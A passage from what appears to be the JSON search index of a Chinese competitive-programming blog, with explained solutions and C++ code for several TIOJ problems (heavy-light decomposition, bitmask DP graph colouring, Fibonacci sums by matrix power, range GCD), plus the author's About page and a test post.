weight[N],sumc,tot; ll dis[N],sumd; void add_edge(int a,int b,int c) { g[a].push_back({c,b}); g[b].push_back({c,a}); } void dfs(int i) { sz[i] = 1; mxs[i] = 0; for(auto \u0026amp;edge:g[i]) { int j = edge.to; int c = edge.cost; if(j == pa[i]) continue; pa[j] = i; pa_d[j] = c; dis[j] = dis[i] + c; dfs(j); sz[i]+=sz[j]; if(mxs[i]==0 || sz[j] \u0026gt; sz[mxs[i]]) mxs[i] = j; } } void deco(int i,int t) { link_top[i] = t; weight[id[i] = tot++] = pa_d[i]; if(mxs[i]) deco(mxs[i],t); for(auto \u0026amp;edge:g[i]) { int j = edge.to; if(j == pa[i] || j == mxs[i]) continue; deco(j,j); } } void init(int n) { dfs(1); deco(1,1); sgt.init(weight,n); } void poke(int x) { sumd += dis[x]; ++sumc; while(x) { int y = link_top[x]; sgt.edit(id[y],id[x]+1,1); x = pa[y]; } } ll query(int x) { ll res = sumc * dis[x] + sumd; while(x) { int y = link_top[x]; res -= 2*sgt.query(id[y],id[x]+1); x = pa[y]; } return res; } } HLD; bool color[N]; signed main() { ios_base::sync_with_stdio(0), cin.tie(0); int n,q; cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; q; for(int i = 1,a,b,c; i \u0026lt; n; i++) { cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b \u0026gt;\u0026gt; c; ++a, ++b; HLD.add_edge(a,b,c); } HLD.init(n); while(q--) { int t,x; cin \u0026gt;\u0026gt; t \u0026gt;\u0026gt; x, ++x; if(t == 1) { if(!color[x]) color[x] = 1, HLD.poke(x); }else if(t == 2) { cout \u0026lt;\u0026lt; HLD.query(x) \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } } } ","permalink":"https://omeletwithoutegg.github.io/2019/12/04/TIOJ-1171/","tags":["TIOJ","tree","data-structure"],"title":"TIOJ-1171"},{"contents":"排教室問題 https://tioj.ck.tp.edu.tw/problems/1197\nDescription 某校有M種不同的課程，其中有些課程的時間會有衝堂。如果學校中總共有N間不同的教室，請問共有多少種安排各課程上課教室的方式？最少要用到幾間教室？\n$M,N \\leq 10$\n註: 衝堂的意思是他們不能被安排在同一個教室\nSolution 題目可以想成給定一張圖，每個頂點有$k$種顏色可以塗，定義合法塗色是讓相鄰頂點無同色的塗色方式，問有幾種合法塗色的方式以及至少要用多少顏色才能合法塗色\n一開始覺得這是暴搜題，但忽然想到可能不連通也可能會有環之後就不太知道怎麼實作\n另外題敘好像沒有講到，不過這題讀邊的時候要用EOF讀\n這題我的寫法是位元DP，考慮狀態$dp[S][c]$代表$c$之前的顏色都用過了，並且$S$這個subset已經被塗過了\n那轉移可以想成把$S$的一個subset$X$都塗上$c$這個顏色，當然$X$中任意兩個頂點都不相鄰(也就是說$X$是獨立集)，式子長得像\n$$\ndp[S][c] = \\sum\\limits _ {X \\subseteq S, Valid(X)} dp[S \\setminus X][c-1]\n$$\n其中$Valid(X)$代表$X$是否為獨立集，可以先預處理\n預處理獨立集可以做到$\\mathcal{O}(n \\cdot 2^n)$，而後面枚舉$k$次子集則是$\\mathcal{O}(k \\cdot 3^n)$\n註: 一次枚舉複雜度是$\\mathcal{O}(3^n)$的原因可以參考 https://cp-algorithms.com/algebra/all-submasks.html\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 #include \u0026lt;cstdio\u0026gt; #include \u0026lt;algorithm\u0026gt; using namespace std; const int N = 10; typedef long long ll; int k,n,a,b,valid[1\u0026lt;\u0026lt;N],g[N][N]; ll dp[1\u0026lt;\u0026lt;N][N]; signed main() { scanf(\u0026#34;%d%d\u0026#34;,\u0026amp;n,\u0026amp;k); while(~scanf(\u0026#34;%d%d\u0026#34;,\u0026amp;a,\u0026amp;b)) --a, --b, g[a][b] = g[b][a] = true; for(int s = 0; s \u0026lt; (1\u0026lt;\u0026lt;n); s++) valid[s] = true; for(int s = 0; s \u0026lt; (1\u0026lt;\u0026lt;n); s++) { for(int i = n-1; i \u0026gt;= 0; i--) if(s \u0026amp; (1\u0026lt;\u0026lt;i)) { if(!valid[s ^ (1\u0026lt;\u0026lt;i)]) valid[s] = false; for(int j = 0; j \u0026lt; i; j++) if(s \u0026amp; (1\u0026lt;\u0026lt;j)) if(g[i][j]) valid[s] = false; break; } } int ans = n; ll sum = 0; int S = (1\u0026lt;\u0026lt;n)-1; dp[0][0] = 1; for(int c = 1; c \u0026lt;= max(k,n); c++) { for(int s = 0; s \u0026lt; (1\u0026lt;\u0026lt;n); s++) { dp[s][c] = dp[s][c-1]; for(int f = s; f; f = (f-1)\u0026amp;s) if(valid[f]) { dp[s][c] += dp[s^f][c-1]; } } if(dp[S][c]) ans = min(ans, c); } printf(\u0026#34;%lld\\n%d\\n\u0026#34;,dp[S][k],ans); } 話說雖然感覺會需要long long不過TIOJ上似乎沒有會超過int的測資\n另外利用Fast Subset Convolution可以讓後面那部分從$\\mathcal{O}(3^n)$壓到$\\mathcal{O}(n^22^n)$\n可以參考 https://people.csail.mit.edu/rrw/presentations/subset-conv.pdf\n不過常數蠻大的，要$n$大一點才看得出來差異\n","permalink":"https://omeletwithoutegg.github.io/2019/12/04/TIOJ-1197/","tags":["TIOJ","dp","bitmask"],"title":"TIOJ-1197"},{"contents":"F.無限兔子問題 https://tioj.ck.tp.edu.tw/problems/2021\nDescription 令$F_i$是費式數列\n給定$s,t$，求$\\sum\\limits _ {i=s}^t\\binom{F_i}{2}$\nSolution 這題也是有夠數學OwO\n題目所求是$\\sum\\limits _ {i=s}^t\\frac{1}{2}{F_i(F_i - 1)}$\n可以想到分別求$\\sum\\limits _ {i=1}^nF_i$和$\\sum\\limits _ {i=1}^nF_i^2$\n前者可以用\n$$\n\\left[\n\\begin{matrix}\n0 \u0026amp; 1 \u0026amp; 0 \\newline\n1 \u0026amp; 1 \u0026amp; 0 \\newline\n1 \u0026amp; 1 \u0026amp; 1\n\\end{matrix}\n\\right]\n\\left[\n\\begin{matrix}\nF _ {i-2} \\newline\nF _ {i-1} \\newline\nS _ {i-1}\n\\end{matrix}\n\\right] =\n\\left[\n\\begin{matrix}\nF _ {i-1} \\newline\nF_i \\newline\nS_i\n\\end{matrix}\n\\right]\n$$\n來得到前綴$S_i$的值\n然後$F_i^2 = (F _ {i-1}+F _ {i-2})^2 = F _ {i-1}^2 + F _ {i-2}^2 + 2F _ {i-1}F _ {i-2}$\n又有$F_iF _ {i-1} = (F _ {i-1}+F _ {i-2})F _ {i-1} = F _ {i-1}F _ {i-2} + F _ {i-1}^2$\n所以寫成\n$$\n\\left[\n\\begin{matrix}\n0 \u0026amp; 0 \u0026amp; 1 \u0026amp; 0\\newline\n0 \u0026amp; 1 \u0026amp; 1 \u0026amp; 0\\newline\n1 \u0026amp; 2 \u0026amp; 1 \u0026amp; 0\\newline\n1 \u0026amp; 2 \u0026amp; 1 \u0026amp; 1\n\\end{matrix}\n\\right]\n\\left[\n\\begin{matrix}\nF _ {i-2}^2\\newline\nF _ {i-1}F _ {i-2}\\newline\nF _ {i-1}^2\\newline\nQ _ {i-1}\n\\end{matrix}\n\\right] =\n\\left[\n\\begin{matrix}\nF _ {i-1}^2\\newline\nF_iF _ {i-1}\\newline\nF_i^2\\newline\nQ_i\n\\end{matrix}\n\\right]\n$$\n可以得到二次的前綴\n套上矩陣快速冪即可AC本題\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 // __________________ // | ________________ | // || ____ || // || /\\ | || // || /__\\ | || // || / \\ |____ || // ||________________|| // |__________________| // \\###################\\ // \\###################\\ // \\ ____ \\ // \\_______\\___\\_______\\ // An AC a day keeps the doctor away. #pragma g++ optimize(\u0026#34;Ofast\u0026#34;) #pragma loop_opt(on) #include \u0026lt;bits/extc++.h\u0026gt; #ifdef local #define debug(x) (cerr\u0026lt;\u0026lt;#x\u0026lt;\u0026lt;\u0026#34; = \u0026#34;\u0026lt;\u0026lt;(x)\u0026lt;\u0026lt;\u0026#39;\\n\u0026#39;) #else #define debug(x) ((void)0) #endif // local using namespace std; typedef int64_t ll; constexpr ll N = 1025, INF = 1e18, MOD = 1000000007, K = 512, inf = 1e9; constexpr ll modpow(ll e,ll p,ll m=MOD) {ll r=1; for(;p;p\u0026gt;\u0026gt;=1,e=e*e%m) if(p\u0026amp;1) r=r*e%m; return r;} ll inv2 = modpow(2,MOD-2); typedef vector\u0026lt;vector\u0026lt;ll\u0026gt;\u0026gt; matrix; matrix operator*(const matrix \u0026amp;a, const matrix \u0026amp;b) { matrix c(a.size(), vector\u0026lt;ll\u0026gt;(b[0].size())); for(int i = 0; i \u0026lt; a.size(); i++) for(int k = 0; k \u0026lt; b.size(); k++) { ll r = a[i][k]; for(int j = 0; j \u0026lt; b[k].size(); j++) c[i][j] = (c[i][j] + r*b[k][j]) % MOD; } return c; } matrix operator^(matrix e, ll p) { matrix r(e.size(), vector\u0026lt;ll\u0026gt;(e.size())); for(int i = 0; i \u0026lt; e.size(); i++) r[i][i] = 1; while(p) { if(p\u0026amp;1) r = r*e; e = e*e, p\u0026gt;\u0026gt;=1; } return r; } ll solve(ll n) { if(n == 0) return 0; /* [F _ {n-1}, F_n, S_n] [F _ {n-1}^2, F _ {n-1}F_n, F_n^2, Q_n] */ matrix S { {0,1,0}, {1,1,0}, {1,1,1}, }; matrix Q { {0,0,1,0}, {0,1,1,0}, {1,2,1,0}, {1,2,1,1}, }; matrix Rs = {{0},{1},{1}}; matrix Rq = {{0},{0},{1},{1}}; S = (S^(n-1)) * Rs; Q = (Q^(n-1)) * Rq; return (Q[3][0] - S[2][0] + MOD) * inv2 % MOD; } signed main() { ios_base::sync_with_stdio(0), cin.tie(0); ll t,a,b; cin \u0026gt;\u0026gt; t; while(t--) { cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b; cout \u0026lt;\u0026lt; (solve(b) - solve(a-1) + MOD) % MOD \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } } 這題的題源好像是NPSC? 不過我還是查不太到題解，可能太水了吧QQ\n","permalink":"https://omeletwithoutegg.github.io/2019/12/04/TIOJ-2021/","tags":["TIOJ","math","matrix"],"title":"TIOJ-2021"},{"contents":"愛蜜利雅的作業2 https://tioj.ck.tp.edu.tw/problems/1282\nDescription 給定一個長度$n$的正整數序列，有$q$次操作，每次操作可能會對區間$[l,r]$加上$k$或詢問區間$[l,r]$的最大公因數\n$1 \\leq n,q \\leq 10^5$\nSolution 想法是利用區間加值等於對差分的兩個單點修改\n然後有一個性質是 $\\gcd(a,b) = \\gcd(a-b,b)$\n所以$[l,r]$區間的GCD會等於$\\gcd(\\gcd(a _ {l+1}-a_l, a _ {l+2}-a _ {l+1}, \\dots, a_r-a _ {r-1}), a_r)$之類的\n求$a_r$可以用BIT就好，前面那項我則是用線段樹維護\n複雜度$\\mathcal{O}(n\\log c + q\\log n \\log c)$\n注意算完GCD要加絕對值，因為差分會出現負數，此時__gcd可能回傳負數\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 // __________________ // | ________________ | // || ____ || // || /\\ | || // || /__\\ | || // || / \\ |____ || // ||________________|| // |__________________| // \\###################\\ // \\###################\\ // \\ ____ \\ // \\_______\\___\\_______\\ // An AC a day keeps the doctor away. #pragma g++ optimize(\u0026#34;Ofast\u0026#34;) #pragma loop_opt(on) #include \u0026lt;bits/extc++.h\u0026gt; #ifdef local #define debug(x) (cerr\u0026lt;\u0026lt;#x\u0026lt;\u0026lt;\u0026#34; = \u0026#34;\u0026lt;\u0026lt;(x)\u0026lt;\u0026lt;\u0026#39;\\n\u0026#39;) #else #define debug(x) ((void)0) #endif // local using namespace std; typedef int64_t ll; constexpr ll N = 100025, INF = 1e18, MOD = 1000000007, K = 256, inf = 1e9; struct FenwickTree{ ll sum[N],n; void init(ll v[],int _n) { n = _n; for(int i = 1; i \u0026lt;= n; i++) sum[i] = v[i] - v[i-(i\u0026amp;-i)]; } ll query(int p) { ll res = 0; for(; p; p-=p\u0026amp;-p) res += sum[p]; return res; } void edit(int p,ll d) { for(; p\u0026lt;=n; p+=p\u0026amp;-p) sum[p] += d; } } BIT; struct SegmentTree { ll seg[N\u0026lt;\u0026lt;1],n; void init(ll v[],int _n) { n = _n; for(int i = 0; i \u0026lt; n; i++) seg[i+n] = v[i]; for(int i = n-1; i \u0026gt; 0; i--) seg[i] = __gcd(seg[i\u0026lt;\u0026lt;1],seg[i\u0026lt;\u0026lt;1|1]); } ll query(int l,int r) { ll res = 0; for(l+=n,r+=n; l\u0026lt;r; l\u0026gt;\u0026gt;=1,r\u0026gt;\u0026gt;=1) { if(l\u0026amp;1) res = __gcd(res,seg[l++]); if(r\u0026amp;1) res = __gcd(res,seg[--r]); } return abs(res); } void edit(int p,ll d) { for(seg[p+=n]+=d; p\u0026gt;1; p\u0026gt;\u0026gt;=1) seg[p\u0026gt;\u0026gt;1] = __gcd(seg[p],seg[p^1]); } } sgt; int n,q; ll v[N]; signed main() { ios_base::sync_with_stdio(0), cin.tie(0); cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; q; for(int i = 1; i \u0026lt;= n; i++) cin \u0026gt;\u0026gt; v[i]; BIT.init(v,n); for(int i = 0; i \u0026lt; n; i++) v[i] = v[i+1]-v[i]; sgt.init(v,n); while(q--) { int tp,l,r; ll k; cin \u0026gt;\u0026gt; tp; if(tp == 1) { cin \u0026gt;\u0026gt; l \u0026gt;\u0026gt; r \u0026gt;\u0026gt; k; BIT.edit(l,k); BIT.edit(r+1,-k); sgt.edit(l-1,k); sgt.edit(r,-k); }else { cin \u0026gt;\u0026gt; l \u0026gt;\u0026gt; r; cout \u0026lt;\u0026lt; abs(__gcd(BIT.query(r), sgt.query(l,r))) \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } } } 註: 寫題解的時候一直TLE，後來發現是我的edit宣告成ll卻沒回傳東西orz\u0026hellip;\n似乎在TIOJ上宣告成非void的函數而不回傳值有機會出問題\u0026hellip;\n","permalink":"https://omeletwithoutegg.github.io/2019/12/04/TIOJ-1282/","tags":["TIOJ","data-structure","math"],"title":"TIOJ-1282"},{"contents":" 一塊蛋餅 (*’ｰ’*)\n喜歡初音軟軟。初音軟軟是對三月八日老師設計的初音未來玩偶的愛稱，或稱 ふわ、fufu。\n在刷TIOJ的時候都查不到解，所以我想來當那個查的到的解!\n部落格的初衷是寫題解，會出現的內容大概包含但不限於競程。\nIOI 2020 Bronze Medal 2020 北市資訊學科能力競賽第一名（500/500）、全國資訊學科能力競賽第三名 2020 網際網路程式設計全國大賽決賽第一名 IOI 2021 Gold Medal Gold Award (4th place), 2023 ICPC Asia Hue City Regional Bronze Medal (12th place), 2022 ICPC World Finals Luxor (held in Apr. 2024) 6th place, 2024 ICPC Asia Seoul Regional 以上是一些感覺不錯的頭銜，雖然感覺都在提當年勇。\n","permalink":"https://omeletwithoutegg.github.io/about/","tags":null,"title":"About"},{"contents":"這是一篇測試用的文章\nA quick brown fox jumps over the lazy dog.\n引用文字\n標題 二級標題 1 2 3 4 5 #include \u0026lt;iostream\u0026gt; int main() { std::cout \u0026lt;\u0026lt; \u0026#34;Hello hexo\u0026#34; \u0026lt;\u0026lt; std::endl; } 1 2 3 $ hexo clean $ hexo s -g $ echo 7122 ","permalink":"https://omeletwithoutegg.github.io/2019/12/01/hello-world/","tags":["hexo","blog"],"title":"Hello World"},{"contents":"This is the search page, type keywords to search among my articles.\n","permalink":"https://omeletwithoutegg.github.io/search/","tags":null,"title":"Search"}]